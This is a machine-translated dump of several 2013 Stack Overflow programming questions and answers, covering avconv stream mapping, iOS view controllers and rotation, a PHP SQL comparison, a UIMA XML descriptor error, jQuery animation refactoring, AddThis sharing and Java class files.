myex(li<int> *l,const char* s) : out_of_range(s), li(l),str(s) {} 
```

# audio - Avconv：选择德国流不是最高质量的流

> ID：15738239
> 
> 赞同：2
> 
> 时间：2013-04-01T05:42:56.470
> 
> 标签：audio, ffmpeg, libav

我正在将一些输入流从我的 DVB S2 卡转换为 RTMP。

切换到最近的 avconv 和 x264 后一切正常 :)

我唯一不知道的是，如何选择正确的音频流？

源有时最多有 6 个音轨。Avconv 会自动选择比特率最高的那个。但是我想选择“ger”之一：

以下是 ARTE 德语/法语电视频道的流媒体，例如：

```
Input #0, mpegts, from 'http://192.168.1.50:9981/stream/channelid/1035':
  Duration: N/A, start: 19083.694722, bitrate: 15576 kb/s
  Program 1
    Stream #0.0[0xa8], 127, 1/90000: Video: mpeg2video (Main), yuv420p, 544x576 [PAR 32:17 DAR 16:9], 1/50, 15000 kb/s, 25 fps, 90k tb50 tbc
    Stream #0.1[0x70](fre), 204, 1/90000: Audio: mp2, 48000 Hz, stereo, s16p, 192 kb/s
    Stream #0.2[0x71](ger), 207, 1/90000: Audio: mp2, 48000 Hz, stereo, s16p, 128 kb/s
    Stream #0.3[0x72](eng), 207, 1/90000: Audio: mp2, 48000 Hz, stereo, s16p, 128 kb/s
    Stream #0.4[0x73](qaa), 207, 1/90000: Audio: mp2, 48000 Hz, stereo, s16p, 128 kb/s
  No Program
    Stream #0.5[0x3b], 126, 1/90000: Audio: mp1, 0 channels, s16p 
```

libav Docs 真的没那么有用。现在谁做正确的语法？

**编辑：**我找到了 -map 选项： http: [//ffmpeg.org/trac/ffmpeg/wiki/How%20to%20use%20-map%20option](http://ffmpeg.org/trac/ffmpeg/wiki/How%20to%20use%20-map%20option)但不可能按名称映射？仅通过索引？

也许我需要使用 avprobe 来找到“ger”的正确流索引。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-11-15T21:07:39.253

实际上，您需要使用 -map 选项按索引指定流。以下在我的情况下有效（我想选择一个具有更好通道分离的较低分辨率的立体声流，而不是没有合并的更高分辨率的 5.1 流）。

在您的情况下，您想要的（ger）流是“0.2”，除了 avconv 需要冒号分隔符，例如

`avconv -i input.m4v -map 0:2 output.mp3`

# ios - 在 SplitView 控制器中的 2 个视图控制器之间传递 VALUE

> ID：15738240
> 
> 赞同：1
> 
> 时间：2013-04-01T05:43:00.273
> 
> 标签：ios, uisplitviewcontroller, uistoryboardsegue, ipad

我有这样的场景：我是 Xcode 的新手，也做过示例。实际上，我使用了 SplitView 控制器，因为它一切正常，但是当谈到详细视图控制器时，我的意思是在带有两个 ViewController 的 Navigation Cotroller 中。

因为我只是使用“选择器”来获取位置，当我按下 get location 时，它会转到第二个视图控制器，但在这里我没有检索到 Vale。这是一段代码

//ViewController1.h

```
#import "QuerySubmission.h"

@interface MDDetailViewController : UIViewController <UISplitViewControllerDelegate>
{
    IBOutlet UIPickerView *pickerView;
    NSArray *pickerViewArray;
    NSString *setLocation;

}

@property (nonatomic, retain) NSArray *pickerViewArray;
@property (weak, nonatomic) IBOutlet UIPickerView *pickerView;
@property(nonatomic,retain) NSString *setLocation;

@property (strong, nonatomic) id detailItem;

@property (strong, nonatomic) IBOutlet UILabel *detailDescriptionLabel;

- (IBAction)getLocation:(id)sender;

@end 
```

//ViewController1.m

```
 - (IBAction)getLocation:(id)sender {
    int selectedIndex = [self.pickerView selectedRowInComponent:0];
    NSString *message = [NSString stringWithFormat:@"Selected Location: %@",[pickerViewArray objectAtIndex:selectedIndex]];
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:message delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
    [alert show];

    QuerySubmission *obj = [[QuerySubmission alloc] initWithNibName:@"QuerySubmission" bundle:nil];
    obj.location=[pickerViewArray objectAtIndex:selectedIndex];

    //NSLog(@"loc %@", [ pickerViewArray objectAtIndex:selectedIndex]);
    //[ pickerViewArray objectAtIndex:selectedIndex];
} 
```

在这里，我正在获取位置列表并检索

//ViewController2.h

```
#import <UIKit/UIKit.h>
#import "MDDetailViewController.h"

@interface QuerySubmission : UIViewController <UISplitViewControllerDelegate>
{
    NSString *location;
}

@property(nonatomic,retain) NSString *location;
- (IBAction)querySubmit:(id)sender;

@end 
```

但就像移动到另一个控制器一样。它只是打印 "null" 。我是 SplitView 控制器的新手。那么我做错了什么，还是需要在 "delegates """ 处声明任何内容？请做有需要的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:58:45.587

最好将 AppDelegate 用于此类任务！

`@property(nonatomic,retain) NSString *location;`在`AppDelegate.h`文件中声明属性。

重写`getLocation:`方法，如：

```
- (IBAction)getLocation:(id)sender
{
    int selectedIndex = [self.pickerView selectedRowInComponent:0];
    NSString *message = [NSString stringWithFormat:@"Selected Location: %@",[pickerViewArray objectAtIndex:selectedIndex]];
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:message delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
    [alert show];
     [[[UIApplication sharedApplication] delegate] setLocation:(NSString *)[pickerViewArray objectAtIndex:selectedIndex]];
} 
```

在`QuerySubmission`您可以使用以下命令访问该位置：

```
[[[UIApplication sharedApplication] delegate] location]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T05:59:37.213

如果您正在从一个控制器到下一个控制器进行转场，则传递值就像在 ViewController1 实现中添加以下代码一样简单：

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    QuerySubmission * viewController2 = segue.destinationViewController;
    if(viewController2)
    {
        viewController2.location=[pickerViewArray objectAtIndex:selectedIndex];
    }
} 
```

而我自己，我尝试将填充变量最小化到应用程序委托中，这实际上应该主要用于 UIApplicationDelegate 类型的东西，比如应用程序被暂停等。

# php - <> 运算符在查询中不起作用

> ID：15738242
> 
> 赞同：0
> 
> 时间：2013-04-01T05:43:16.377
> 
> 标签：php, sql

让我们关注**event_table**列。我想要做的是获得除“0”之外的所有价值

![在此处输入图像描述](https://i.stack.imgur.com/WE3NW.png)

这是我的查询，

```
$query = "SELECT DISTINCT event_table FROM embedded_page WHERE event_table <> 0 AND uid='". $uid ."'";
$result = db_query($query);
foreach ($result as $r) {

    echo $r->event_table;
} 
```

我正在尝试以不同的方式选择 event_table 的值以防止重复。但是，由于某种原因，我使用了运算符 <>，所以它不起作用。当我回应它时，**没有输出**

如果我删除了**event_table <> 0** ，它会输出 0、giveaway_table 和 poll

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T05:50:41.580

尝试

```
 event_table <> '0' 
```

您正在与字符串列进行比较，但指定了一个整数值，并且 PDO 或您的基础数据库似乎没有以您期望的方式处理 int 到字符串的转换。

此外，您的代码示例容易受到[Sql 注入](http://en.wikipedia.org/wiki/SQL_injection)攻击。

# xml - 无效描述符异常 - 带有 JSF 和 Tomcat 7 的 UIMA

> ID：15738243
> 
> 赞同：1
> 
> 时间：2013-04-01T05:43:16.290
> 
> 标签：xml, jsf-2, uima

我在 TOMCAT 7.0 上运行 UIMA 应用程序时遇到异常。

**脚步**

1）创建了一个动态的Web项目

2) 新增*“添加 UIMA NATURE”*

3）创建原始分析引擎（AE）。每个原始 AE 都有一个注释类型和一个注释器（以[此处](http://sujitpal.blogspot.in/2011/03/smart-query-parsing-with-uima.html)为例）

**来自链接的片段**

**邮编.xml**

```
 <?xml version="1.0" encoding="UTF-8"?>
    <typeSystemDescription xmlns="http://uima.apache.org/resourceSpecifier">
      <name>ZipCode</name>
      <description>Defines the zipcode type</description>
      <version>1.0</version>
      <vendor>MyCompany, Inc.</vendor>
      <types>
        <typeDescription>
          <name>com.mycompany.myapp.uima.annotators.zipcode.ZipCodeAnnotation</name>
          <description>ZipCode</description>
          <supertypeName>uima.tcas.Annotation</supertypeName>
        </typeDescription>
      </types>
    </typeSystemDescription> 
```

**邮编AE.xml**

```
 <?xml version="1.0" encoding="UTF-8" ?>
   <analysisEngineDescription xmlns="http://uima.apache.org/resourceSpecifier">
      <frameworkImplementation>org.apache.uima.java</frameworkImplementation>
      <primitive>true</primitive>
      <annotatorImplementationName>
        com.mycompany.myapp.uima.annotators.zipcode.ZipCodeAnnotator
      </annotatorImplementationName>
      <analysisEngineMetaData>
        <name>Zip Code Annotator</name>
        <description>Recognize and annotate zip code in text</description>
        <version>1.0</version>
        <vendor>MyCompany, Inc.</vendor>
        <configurationParameters></configurationParameters>
        <configurationParameterSettings></configurationParameterSettings>
        <typeSystemDescription>
          <imports>
            <import location="ZipCode.xml"/>
          </imports>
        </typeSystemDescription>
        <typePriorities></typePriorities>
        <fsIndexCollection></fsIndexCollection>
        <capabilities>
          <capability>
            <inputs></inputs>
            <outputs>
              <type>com.mycompany.myapp.uima.annotators.zipcode.ZipCode</type>
            </outputs>
            <languagesSupported></languagesSupported>
          </capability>
        </capabilities>
        <operationalProperties>
          <modifiesCas>true</modifiesCas>
          <multipleDeploymentAllowed>true</multipleDeploymentAllowed>
          <outputsNewCASes>false</outputsNewCASes>
        </operationalProperties>
      </analysisEngineMetaData>
      <externalResourceDependencies></externalResourceDependencies>
      <resourceManagerConfiguration></resourceManagerConfiguration>
    </analysisEngineDescription> 
```

**ZipCodeAnnotator.java**

```
public class ZipCodeAnnotator extends JCasAnnotator_ImplBase {

      private Pattern zipCodePattern = Pattern.compile("\\d{5}(-\\d{4})*");

      @Override
      public void process(JCas jCAS) throws AnalysisEngineProcessException {
        String text = jCAS.getDocumentText();
        Matcher matcher = zipCodePattern.matcher(text);
        int pos = 0;
        while (matcher.find(pos)) {
          ZipCodeAnnotation annotation = new ZipCodeAnnotation(jCAS);
          annotation.setBegin(matcher.start());
          annotation.setEnd(matcher.end());
          annotation.addToIndexes();
          pos = matcher.end();
        }
      }
    } 
```

**测试用例**

```
public class AddressAnnotatorTest {

  private final String[] TEST_STRINGS = new String[] {
    "Dr Goldwater, University of Michigan, Ann Arbor, MI 01234",
    "Microsoft, 1 Microsoft Way, Redmond, WA",
    "Apple, 1 Infinite Loop, Cupertino, CA 95014",
    "IBM, 1 New Orchard Road, Armonk, NY 10504",
    "Google, 1600 Amphitheater Parkway, Mountain View, CA 94043",
    "Healthline, 600 3rd Street, San Francisco, CA 94107",
    "Jane Doe, Lake Tahoe, California",
    "Miss Liberty, Empire State Building, New York, NY"
  };

  @Test
  public void testAddressAE() throws Exception {
    AnalysisEngine ae = TestUtils.getAE(
      "src/main/java/com/mycompany/myapp/uima/annotators/aggregates/AddressAE.xml", 
      null);
    for (String text : TEST_STRINGS) {
      JCas jcas = TestUtils.runAE(ae, text);
      TestUtils.printResults(jcas);
    }
  }
} 
```

如果我通过 JUnit 测试用例（如上面的代码中给出的）测试这个应用程序，它运行成功，没有任何异常，但是当我通过创建一个带有按钮的简单 xhtml 页面在 Tomcat 上运行这个应用程序时。并且单击按钮时，它会引发异常。

**这是代码片段**

**XHTML**

```
 <p:commandButton id="create" value="Print Result"
    actionListener="#{demoClass.testZipAE}" ajax="true">
    </p:commandButton> 
```

**DemoClass.java**

```
@ManagedBean(name = "demoClass")
@SessionScoped()
public class DemoClass implements Serializable {

public AnalysisEngine getAE(
              String descriptor, Map<String,Object> params) 
              throws IOException, InvalidXMLException, 
              ResourceInitializationException {
            AnalysisEngine ae = null;
            try {

              XMLInputSource in = new XMLInputSource(ClassLoader.getSystemResourceAsStream(descriptor), null);
              AnalysisEngineDescription desc = 
                UIMAFramework.getXMLParser().
                parseAnalysisEngineDescription(in);
              if (params != null) {
                for (String key : params.keySet()) {
                  desc.getAnalysisEngineMetaData().
                  getConfigurationParameterSettings().
                  setParameterValue(key, params.get(key));
                }
              }
              ae = UIMAFramework.produceAnalysisEngine(desc);
            } catch (Exception e) {
              throw new ResourceInitializationException(e);
            }
            return ae;
          }

          public JCas runAE(AnalysisEngine ae, String text)
              throws AnalysisEngineProcessException, 
              ResourceInitializationException {
            JCas jcas = ae.newJCas();
            jcas.setDocumentText(text);
            ProcessTrace trace = ae.process(jcas);
            for (ProcessTraceEvent evt : trace.getEvents()) {
              if (evt != null && evt.getResultMessage() != null &&
                  evt.getResultMessage().contains("error")) {
                throw new AnalysisEngineProcessException(
                  new Exception(evt.getResultMessage()));
              }
            }
            return jcas;
          }

          public void printResults(JCas jcas) {
            FSIndex index = jcas.getAnnotationIndex();
            for (Iterator<Annotation> it = index.iterator(); it.hasNext(); ) {
              Annotation annotation = it.next();
              List<Feature> features = new ArrayList<Feature>();
              if (annotation.getType().getName().contains("com.mycompany")) {
                features = annotation.getType().getFeatures();
              }
              List<String> fasl = new ArrayList<String>();
              for (Feature feature : features) {
                if (feature.getName().contains("com.mycompany")) {
                  String name = feature.getShortName();
                  String value = annotation.getStringValue(feature);
                  fasl.add(name + "=\"" + value + "\"");
                }
              }
              System.out.println(
                annotation.getType().getShortName() + ": " +
                annotation.getCoveredText() + " " +
                (fasl.size() > 0 ? StringUtils.join(fasl.iterator(), ",") : "") + " " +
                annotation.getBegin() + ":" + annotation.getEnd());
            }
            System.out.println("==");
          }

          public void testZipAE(ActionEvent event) throws AnalysisEngineProcessException, ResourceInitializationException {
            AnalysisEngine ae;
            try {
                ae = getAE(
                  "TestAE.xml", 
                  null);
                 for (String text : TEST_STRINGS) {
                      JCas jcas = runAE(ae, text);
                      printResults(jcas);
                    }
            } catch (InvalidXMLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (ResourceInitializationException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
          } 
```

**测试AE.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<analysisEngineDescription xmlns="http://uima.apache.org/resourceSpecifier">
  <frameworkImplementation>org.apache.uima.java</frameworkImplementation>
  <primitive>false</primitive>
  <delegateAnalysisEngineSpecifiers>
    <delegateAnalysisEngine key="ZipCodeAE">
      <import location="ZipCodeAE.xml"/>
    </delegateAnalysisEngine>
  </delegateAnalysisEngineSpecifiers>
  <analysisEngineMetaData>
    <name>TestAE</name>
    <description>Runs the delegate AEs together</description>
    <version>1.0</version>
    <configurationParameters searchStrategy="language_fallback"/>
    <configurationParameterSettings/>
    <flowConstraints>
      <fixedFlow>
        <node>ZipCodeAE</node>
      </fixedFlow>
    </flowConstraints>
    <typePriorities/>
    <fsIndexCollection/>
    <capabilities>
      <capability>
        <inputs/>
        <outputs/>
        <languagesSupported/>
      </capability>
    </capabilities>
    <operationalProperties>
      <modifiesCas>true</modifiesCas>
      <multipleDeploymentAllowed>true</multipleDeploymentAllowed>
      <outputsNewCASes>false</outputsNewCASes>
    </operationalProperties>
  </analysisEngineMetaData>
  <resourceManagerConfiguration/>
</analysisEngineDescription> 
```

**例外**

```
 org.apache.uima.resource.ResourceInitializationException: Invalid descriptor at <unknown source>.
        at com.acn.hps.alpes.gi.cip.jsf.AnalyzeFile.getAE(AnalyzeFile.java:208)
        at com.acn.hps.alpes.gi.cip.jsf.AnalyzeFile.testAddressAE(AnalyzeFile.java:145)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.el.parser.AstValue.invoke(AstValue.java:278)
        at org.apache.el.MethodExpressionImpl.invoke(MethodExpressionImpl.java:274)
        at com.sun.faces.facelets.el.TagMethodExpression.invoke(TagMethodExpression.java:105)
        at javax.faces.component.MethodBindingMethodExpressionAdapter.invoke(MethodBindingMethodExpressionAdapter.java:88)
        at com.sun.faces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:101)
        at javax.faces.component.UICommand.broadcast(UICommand.java:315)
        at javax.faces.component.UIViewRoot.broadcastEvents(UIViewRoot.java:794)
        at javax.faces.component.UIViewRoot.processApplication(UIViewRoot.java:1259)
        at com.sun.faces.lifecycle.InvokeApplicationPhase.execute(InvokeApplicationPhase.java:81)
        at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
        at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:118)
        at javax.faces.webapp.FacesServlet.service(FacesServlet.java:593)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.primefaces.webapp.filter.FileUploadFilter.doFilter(FileUploadFilter.java:77)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
        at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:929)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
        at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1002)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
        at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
    Caused by: org.apache.uima.util.InvalidXMLException: Invalid descriptor at <unknown source>.
        at org.apache.uima.util.impl.XMLParser_impl.parse(XMLParser_impl.java:194)
        at org.apache.uima.util.impl.XMLParser_impl.parseAnalysisEngineDescription(XMLParser_impl.java:492)
        at org.apache.uima.util.impl.XMLParser_impl.parseAnalysisEngineDescription(XMLParser_impl.java:473)
        at com.acn.hps.alpes.gi.cip.jsf.AnalyzeFile.getAE(AnalyzeFile.java:198)
        ... 36 more
    Caused by: org.xml.sax.SAXParseException: Content is not allowed in prolog.
        at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source)
        at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source)
        at org.apache.uima.util.impl.XMLParser_impl.parse(XMLParser_impl.java:177)
        ... 39 more 
```

我最初认为，由于 XML 中的任何无效字符，异常被抛出，然后按照此链接（[XML - Data At Root Level is Invalid](https://stackoverflow.com/questions/291455/xml-data-at-root-level-is-invalid)）并确保 xml 编码时没有 BOM（字节顺序标记）。不幸的是，这没有帮助。

任何想法如何摆脱这个异常。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-22T08:29:07.563

`<xml version="1.0" encoding="UTF-8" ?>`通常必须是 XML 文件中的第一件事。没有空格，前面没有多余的行。看起来`ZipCodeAE.xml`可能没有遵循该要求。

否则，使用调试器来发现问题真正发生在哪个文件中，肯定会有所帮助。

# javascript - 将具有多个函数的 javascript 简化为单个函数数组

> ID：15738246
> 
> 赞同：0
> 
> 时间：2013-04-01T05:43:27.997
> 
> 标签：javascript, jquery, arrays, function, user-defined-functions

因此，我试图简化我的脚本，使其不必使用带有 setintervals 和 clearintervals 的多个函数，而只有一个可以同时运行的函数，就好像它是一堆不同的函数一样，比如一个数组，所以文件不是那么大。这是脚本的示例[http://test.719records.com/test/test.html](http://test.719records.com/test/test.html)（页面以 1080P 或更高的分辨率查看），这里是整个脚本 [http://test。 719records.com/test/jquery.solari.letters.js](http://test.719records.com/test/jquery.solari.letters.js)

这是我希望最终被迭代的脚本的摘录。

```
//randomize name1 li:1 frames
//until correct character is landed on
var randlet = 0;

function randomizerlet1_1() {
    randlet = Math.floor(Math.random() * 156);
    timesletrun[0] += 1;
    if (masterlet[randlet] == letter[0]) {
        $('#flipL1_1').css('background-position', masterlet[randlet]);
        clearInterval(intervallet1_1);
    } else {
        if (timesletrun[0] == 300) {
            masterlet[randlet] = letter[0];
            $('#flipL1_1').css('background-position', masterlet[randlet]);
            clearInterval(intervallet1_1);
        } else {
            $('#flipL1_1').css('background-position', masterlet[randlet]);
        }
    }
}

var intervallet1_1 = setInterval(function() {
    randomizerlet1_1();
}, 10); 
```

这将是序列中的第二个字母：

```
//randomize name1 li:2 frames
//until correct character is landed on
function randomizerlet1_2() {
    randlet = Math.floor(Math.random() * 156);
    timesletrun[1] += 1;
    if (masterlet[randlet] == letter[1]) {
        $('#flipL1_2').css('background-position', masterlet[randlet]);
        clearInterval(intervallet1_2);
    } else {
        if (timesletrun[1] == 300) {
            masterlet[randlet] = letter[1];
            $('#flipL1_2').css('background-position', masterlet[randlet]);
            clearInterval(intervallet1_2);
        } else {
            $('#flipL1_2').css('background-position', masterlet[randlet]);
        }
    }
}

var intervallet1_2 = setInterval(function() {
    randomizerlet1_2();
}, 10); 
```

现在总共有 38 个运行 1 行，最终将有 28 行。很抱歉，我的知识不是专家级的，我还在学习，所以这可能很容易，也可能不是，但如果可能的话，我需要将这些简化为一个迭代函数。也许使用多维数组和函数参数？我不确定这段代码的外观。

如果这可以简化，我将为它创建一个教程并将其包装到一个免费的 3rd 方插件中，供人们在他们自己的个人项目中使用！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T07:23:31.960

这是一个开始 - 正在进行的工作

[小提琴](http://jsfiddle.net/mplungjan/m6byR/)

```
$(function() {
  var products= new Array(4);
  var letters = new Array(39);
  var numbers = new Array(4);
  $.each(products,function(i) {
    var aDIV = $("<div/>",{"class":"product"});
    var aUL  = $("<ul/>",{"class":"cd"});
    var logoLI = $("<li/>",{"class":"logo","id":"logo"+(i+1)});
    aUL.append(logoLI);
    var aLI;
    $.each(letters,function(j){
      aLI=$("<li/>",{"class":"flipletters","id":"flipL"+i+"_"+j,}).css("background-position", "0px 0px").appendTo(aUL);
    });
    $.each(numbers,function(j){
      aLI=$("<li/>",{"class":"flipdigits","id":"flip"+i+"_"+j,}).css("background-position", "0px 0px").appendTo(aUL);
    });
    $(".wrapper").append("<br style='clear:both'/>").append(aDIV.append(aUL));
  });
});
var masterlet = []
var cnt = 0;
$.each(",A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z".split(","),function(n, let) {
    for (var i=0;i<6;i++) {
        masterlet.push("0px -"+(60*cnt++)+"px");
    }                
});
masterlet.push("0px -"+(60*cnt++)+"px");
masterlet.push("0px -"+(60*cnt++)+"px");

function randomizerlet(letId,letPos) {
    if (letPos) {
        this.letPos = letPos;
        this.timesletrun=0;
        this.letId = letId;
        this.tId=setInterval(function() {
          randomizerlet(letId);
        }, 10);
    }
    var randlet = masterlet[Math.floor(Math.random() * masterlet.length)];
    this.timesletrun++;
    var thisLI = $('#'+letId); 
    if (masterlet[randlet] == this.letPos) {
        thisLI.css('background-position', randlet);
        clearInterval(this.tId);
    } else {
        if (this.timesletrun == 300) {
            thisLI.css('background-position', this.letPos);
            clearInterval(this.tId);
        } else {
            thisLI.css('background-position', randlet);
        }
    }
} 
```

# iphone - 自转未正常进行

> ID：15738247
> 
> 赞同：0
> 
> 时间：2013-04-01T05:43:39.427
> 
> 标签：iphone, ios, ipad

我正在为 iPad 工作，但我遇到了一个奇怪的问题。

问题是如果我开始使用 ipad 作为纵向视图并将 ipad 旋转到横向。它显示的是肖像的大小，而不是风景的大小。以同样的方式，如果我开始使用 ipad 作为横向视图并将 ipad 旋转到纵向视图。它显示的是横向的大小，而不是纵向的。我正在使用下面的代码来更改对象的大小

```
- (void)viewDidLoad {

 UIInterfaceOrientation interfaceOrientation = self.interfaceOrientation;
    if (interfaceOrientation == UIInterfaceOrientationLandscapeRight
        || interfaceOrientation == UIInterfaceOrientationLandscapeLeft)
    {
        table.frame = CGRectMake(83, 600, 550, 275);
           im.frame = CGRectMake(0, 62, 775, 70);
          im1.frame = CGRectMake(0, 135, 775, 40);
        im2.frame = CGRectMake(60, 325, 650, 550);
         l17.frame = CGRectMake(0, 62, 775, 70);
        l16.frame = CGRectMake(85, 145, 780, 40);
           l15.frame = CGRectMake(83, 200, 600, 40);
        img.frame = CGRectMake(550, 300, 150, 110);
        l18.frame = CGRectMake(28, 550, 650, 40);
           b7.frame = CGRectMake(83, 880, 600, 40);
        //[self.view addSubview:table];

    }

    [super viewDidLoad];
} 
```

请建议我出了什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T05:58:39.490

```
-(void)willRotateToInterfaceOrientation: (UIInterfaceOrientation)orientation duration:(NSTimeInterval)duration {

    if ((orientation == UIInterfaceOrientationLandscapeLeft) || (orientation == UIInterfaceOrientationLandscapeRight))
        table.frame = CGRectMake(83, 600, 550, 275);
        im.frame = CGRectMake(0, 62, 775, 70);
        im1.frame = CGRectMake(0, 135, 775, 40);
        im2.frame = CGRectMake(60, 325, 650, 550);
        l17.frame = CGRectMake(0, 62, 775, 70);
        l16.frame = CGRectMake(85, 145, 780, 40);
        l15.frame = CGRectMake(83, 200, 600, 40);
        img.frame = CGRectMake(550, 300, 150, 110);
        l18.frame = CGRectMake(28, 550, 650, 40);
        b7.frame = CGRectMake(83, 880, 600, 40);
    else
        tableView.frame = CGRectMake(0,73,320,390);
        --
        --

} 
```

你试过这样吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:35:46.430

**检查方向的代码是否有效？**

代码 ：：

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(orientationChanged) name:@"UIDeviceOrientationDidChangeNotification" object:nil];
    ......
} 
```

检查方法::

```
-(void)orientationChanged {

   NSLog(@"Orientation Changed..!!");

   UIInterfaceOrientation interfaceOrientation = self.interfaceOrientation;

   //Lanscape View
   if (interfaceOrientation == UIInterfaceOrientationLandscapeRight
    || interfaceOrientation == UIInterfaceOrientationLandscapeLeft)
   {
       table.frame = CGRectMake(83, 600, 550, 275);
       .....
   }

   //Portrait View
   else
   {
       table.frame = CGRectMake(x, y, w, h);
       .....
   }
} 
```

**方向改变方法的代码**

在 PCH 文件中，

```
#define IOS_OLDER_THAN_6        ( [ [ [ UIDevice currentDevice ] systemVersion ] floatValue ] < 6.0 )
#define IOS_NEWER_OR_EQUAL_TO_6 ( [ [ [ UIDevice currentDevice ] systemVersion ] floatValue ] >= 6.0 ) 
```

在 .m 文件中，

```
//For Less than IOS 6

#ifdef IOS_OLDER_THAN_6
- (BOOL)shouldAutorotateToInterfaceOrientation: (UIInterfaceOrientation)toInterfaceOrientation
{
   return toInterfaceOrientation;
}
#endif

// For Newer than IOS 6.
#ifdef IOS_NEWER_OR_EQUAL_TO_6
-(BOOL)shouldAutorotate
{
   return YES;
}
- (NSUInteger)supportedInterfaceOrientations
{
   return (UIInterfaceOrientationMaskAll);
}
#endif 
```

希望对您有所帮助。

谢谢。

# facebook - 使用 Addthis 在 Facebook 上分享时如何设置自定义消息？

> ID：15738249
> 
> 赞同：0
> 
> 时间：2013-04-01T05:44:17.003
> 
> 标签：facebook, addthis

我正在尝试在使用 addthis 模块共享页面（通过 facebook）时设置自定义消息。到目前为止，我已经成功地设置了自定义标题、描述和图像（[这](http://support.addthis.com/customer/portal/articles/381222-optimize-facebook-sharing#.UVkeSqspa0w)是我使用的参考），但我还需要能够在共享者可以放置的文本框上设置自定义消息在评论中。

无论如何使用 addthis 模块可以做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-07-09T17:23:23.290

这是不可能的。

根据[平台政策 2.3](https://developers.facebook.com/docs/apps/review/prefill "平台政策 2.3")，不允许

> 使用用户未自己输入的任何内容预填充用户消息参数，即使他们可以在共享之前编辑或删除该内容。这适用于帖子、评论、照片说明和相册说明。

# java - 在我的班级中，没有内部类 Java $ simple 在类文件中

> ID：15738250
> 
> 赞同：-1
> 
> 时间：2013-04-01T05:44:19.437
> 
> 标签：java

我已经编译了一个 java 文件，假设 test.java 使用 javac test.java

编译后生成两个类文件test.class和test$.class。

任何人都可以帮助我了解 $ 类文件。代码运行良好。我需要了解 $ 类文件。

它是一个临时文件吗？

下面是我的代码包test.myfolder；

公开课测试{

```
public String Login;
public String Name;
public String Num;
public String AccNum;

public test()
{
    this.Login = Abc.getMissChar();
    this.Name = Abc.getMissChar();
    this.Num = Abc.getMissChar();
    this.AccNum = Abc.getMissChar();
}

public test(String pLogin, String pName, String pNum, String pAccNum)
{
    this.Login = pLogin;
    this.Name = pName;
    this.Num = pNum;
    this.AccNum = pNum;
}

public String getLogin() {
    return Login;
}

public String getName() {
    return Name;
}

public String getNum() {
    return Num;
}

public String getAccNum() {
    return AccNum;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:02:06.537

如果一个源文件有多个类，每个类都会编译成一个单独的类文件，我认为你的类中还有另一个内部或匿名类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T05:46:26.763

如果您有匿名类（或者[可能只是一个 switch 语句](https://stackoverflow.com/a/402331/14955)），Java 会在其中创建这些额外的类文件`$`。

这些不是临时文件。Java 将需要它们来加载您的类。

# iphone - 如何通过手势更改报价

> ID：15738258
> 
> 赞同：1
> 
> 时间：2013-04-01T05:45:06.293
> 
> 标签：iphone, ios, ios4

